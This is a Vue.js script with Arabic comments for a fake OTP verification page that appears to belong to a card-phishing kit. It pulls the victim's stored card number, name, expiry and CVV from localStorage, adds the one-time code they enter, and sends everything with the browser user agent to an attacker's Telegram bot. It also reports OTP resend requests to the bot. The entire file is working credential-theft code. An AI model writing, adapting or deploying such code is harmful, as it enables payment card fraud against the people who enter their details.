/*
صفحة التحقق OTP مع إرسال تلقائي إلى بوت تليجرام
*/

new Vue({
  el: "#otp-app",
  data() {
    return {
      otpCode: "",
      timeRemaining: 300, // 5 دقائق
      timerInterval: null,
      canResend: false,
      resendCountdown: 60,
      resendInterval: null,
      cardData: null, // بيانات البطاقة من الصفحة السابقة
      isSubmitting: false // لمنع الإرسال المتكرر
    };
  },
  computed: {
    isOtpValid() {
      return this.otpCode.length === 4 || this.otpCode.length === 6;
    },
    timePercentage() {
      return (this.timeRemaining / 300) * 100;
    }
  },
  mounted() {
    // استرجاع بيانات البطاقة من localStorage
    const savedCardData = localStorage.getItem('cardData');
    if (savedCardData) {
      try {
        this.cardData = JSON.parse(savedCardData);
      } catch (error) {
        console.error("خطأ في استرجاع بيانات البطاقة:", error);
      }
    }

    // بدء العد التنازلي
    this.startTimer();
    
    // التركيز على حقل الإدخال
    this.$nextTick(() => {
      const otpInput = document.getElementById("otpCode");
      if (otpInput) {
        otpInput.focus();
      }
    });

    // بدء مؤقت إعادة الإرسال
    this.startResendCountdown();
  },
  beforeDestroy() {
    // إيقاف المؤقتات عند مغادرة الصفحة
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
    if (this.resendInterval) {
      clearInterval(this.resendInterval);
    }
  },
  methods: {
    validateOtpInput(event) {
      // السماح فقط بالأرقام
      this.otpCode = this.otpCode.replace(/[^0-9]/g, '');
      
      // تحديد الحد الأقصى إلى 6 أرقام
      if (this.otpCode.length > 6) {
        this.otpCode = this.otpCode.slice(0, 6);
      }

      // الإرسال التلقائي عند إدخال 6 أرقام
      if (this.otpCode.length === 6) {
        this.$nextTick(() => {
          this.submitOtp();
        });
      }
    },
    formatTime(seconds) {
      const mins = Math.floor(seconds / 60);
      const secs = seconds % 60;
      return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    },
    startTimer() {
      this.timerInterval = setInterval(() => {
        this.timeRemaining--;
        
        if (this.timeRemaining <= 0) {
          clearInterval(this.timerInterval);
          this.timeRemaining = 0;
          alert("⏰ انتهت صلاحية الرمز. يرجى طلب رمز جديد");
        }
      }, 1000);
    },
    /**
     * تنسيق رسالة التحقق من OTP
     */
    formatOtpMessage() {
      return `
🔐 <b>تم التحقق من رمز OTP:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>رمز التحقق:</b> <code>${this.otpCode}</code>
⏱️ <b>الوقت المتبقي:</b> ${this.formatTime(this.timeRemaining)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 <b>بيانات البطاقة الأصلية:</b>
💳 <b>رقم البطاقة:</b> <code>${this.cardData?.cardNumber || 'غير متاح'}</code>
👤 <b>اسم صاحب البطاقة:</b> ${this.cardData?.cardName || 'غير متاح'}
📅 <b>تاريخ الانتهاء:</b> ${this.cardData?.cardMonth}/${this.cardData?.cardYear}
🔐 <b>CVV:</b> <code>${this.cardData?.cardCvv || 'غير متاح'}</code>
💳 <b>نوع البطاقة:</b> ${(this.cardData?.cardType || 'unknown').toUpperCase()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
🌐 <b>الجهاز:</b> ${navigator.userAgent}
      `.trim();
    },
    /**
     * إرسال رمز التحقق إلى تليجرام
     */
    submitOtp() {
      // منع الإرسال المتكرر
      if (this.isSubmitting) {
        alert("⏳ جاري إرسال البيانات، يرجى الانتظار...");
        return;
      }

      if (!this.isOtpValid) {
        alert("❌ يرجى إدخال 4 أو 6 أرقام");
        return;
      }

      if (this.timeRemaining <= 0) {
        alert("⏰ انتهت صلاحية الرمز. يرجى طلب رمز جديد");
        return;
      }

      // التحقق من إعدادات تلجرام
      if (!validateTelegramConfig()) {
        alert("❌ خطأ: إعدادات تلجرام غير صحيحة. يرجى تحديث ملف config.js");
        return;
      }

      this.isSubmitting = true;

      // إنشء رسالة البيانات
      const message = this.formatOtpMessage();

      // إرسال الرسالة إلى تليجرام
      sendToTelegram(message)
        .then(data => {
          alert("✅ تم التحقق بنجاح! تم إرسال البيانات إلى تليجرام");
          // مسح البيانات المحفوظة
          localStorage.removeItem('cardData');
          // إعادة التوجيه أو إعادة تعيين النموذج
          setTimeout(() => {
            this.resetForm();
          }, 1500);
        })
        .catch(error => {
          console.error("خطأ في الإرسال:", error);
          alert(`❌ حدث خطأ أثناء الإرسال:\n${error.message}`);
        })
        .finally(() => {
          this.isSubmitting = false;
        });
    },
    resendOtp() {
      if (!this.canResend) {
        alert(`⏳ يرجى الانتظار ${this.resendCountdown} ثانية قبل إعادة الطلب`);
        return;
      }

      // إعادة تعيين المؤقت
      this.timeRemaining = 300;
      this.otpCode = "";
      this.canResend = false;
      this.resendCountdown = 60;

      // إعادة بدء المؤقت الرئيسي
      if (this.timerInterval) {
        clearInterval(this.timerInterval);
      }
      this.startTimer();

      // بدء مؤقت إعادة الإرسال
      this.startResendCountdown();

      // إرسال رسالة إلى تليجرام بأن الرمز تم إعادة إرساله
      this.sendResendNotification();

      alert("✅ تم إعادة إرسال الرمز");
    },
    startResendCountdown() {
      this.resendInterval = setInterval(() => {
        this.resendCountdown--;
        
        if (this.resendCountdown <= 0) {
          clearInterval(this.resendInterval);
          this.canResend = true;
          this.resendCountdown = 60;
        }
      }, 1000);
    },
    /**
     * إرسال إشعار إعادة الإرسال إلى تليجرام
     */
    sendResendNotification() {
      const message = `
🔄 <b>تم طلب إعادة إرسال رمز OTP</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
🌐 <b>الجهاز:</b> ${navigator.userAgent}
      `.trim();

      sendToTelegram(message)
        .catch(error => console.error("خطأ في إرسال إشعار إعادة الإرسال:", error));
    },
    goBack() {
      if (confirm("هل تريد العودة إلى الصفحة السابقة؟")) {
        // مسح البيانات المحفوظة
        localStorage.removeItem('cardData');
        // إيقاف المؤقتات
        if (this.timerInterval) {
          clearInterval(this.timerInterval);
        }
        if (this.resendInterval) {
          clearInterval(this.resendInterval);
        }
        // إعادة التوجيه إلى الصفحة الأولى
        window.location.href = 'index.html';
      }
    },
    resetForm() {
      this.otpCode = "";
      this.timeRemaining = 300;
      this.canResend = false;
      this.resendCountdown = 60;
      
      // إيقاف المؤقتات
      if (this.timerInterval) {
        clearInterval(this.timerInterval);
      }
      if (this.resendInterval) {
        clearInterval(this.resendInterval);
      }
      
      // إعادة التوجيه إلى الصفحة الأولى
      window.location.href = 'index.html';
    }
  }
});
